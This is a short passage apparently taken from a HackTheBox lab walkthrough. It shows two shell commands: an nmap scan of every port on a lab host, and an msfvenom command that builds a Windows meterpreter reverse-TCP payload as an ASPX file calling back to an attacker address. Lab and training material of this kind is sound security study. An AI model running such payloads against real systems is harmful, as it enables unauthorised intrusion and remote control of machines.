...
```shell-session
xF1NN@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
...
```shell-session
xF1NN@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
